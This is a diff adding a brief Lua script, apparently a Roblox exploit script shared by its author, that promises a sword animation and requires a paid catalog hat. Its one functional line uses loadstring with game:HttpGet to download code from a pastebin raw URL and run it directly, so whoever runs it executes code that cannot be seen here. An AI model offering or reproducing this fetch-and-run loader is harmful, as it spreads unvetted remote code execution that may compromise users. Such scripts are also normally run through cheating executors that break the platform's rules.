@@ -1,0 +1,11 @@
+--[[This is my first script, and its pretty simple. So ye, just don't say its urs
+
+Hats Required: https://www.roblox.com/catalog/4315489767/Demonic-Greatsword (100 robux)
+
+If you know a bit about lua, and want to change the sword you can change it to the swords here: https://cdn.discordapp.com/attachments/729592441266634884/962875377645154304/unknown.png
+]]--
+loadstring(game:HttpGet("https://pastebin.com/raw/tBk7NxXe"))()
+
+--I used nexo animator to made this script :)
+--(V2)
+--hampter#2656
